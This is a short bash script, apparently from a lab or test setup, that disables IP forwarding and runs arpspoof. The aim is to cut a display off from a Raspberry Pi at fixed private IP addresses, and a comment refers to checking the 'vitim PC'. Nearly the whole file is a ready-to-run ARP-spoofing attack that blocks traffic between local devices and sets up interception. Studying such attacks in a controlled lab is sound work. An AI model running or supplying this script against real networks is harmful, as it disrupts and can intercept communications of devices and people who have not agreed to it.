# This script is used to disconnect the Raspberry Pi and the display from the network by ARP spoofing.
#!/bin/bash
PI_ADDRESS="172.26.87.132"
DISPLAY_ADRESS="172.26.9.140"

. $(dirname "$0")/config.sh

# Disconnect ip forwarding
sudo sysctl -w net.ipv4.ip_forward=0
 
# Run ARP spoofing to disconnect the Raspberry Pi and the display
sudo arpspoof -i $INTERFACE -t $DISPLAY_ADRESS $PI_ADDRESS
 
# Check the vitim PC
# arp -a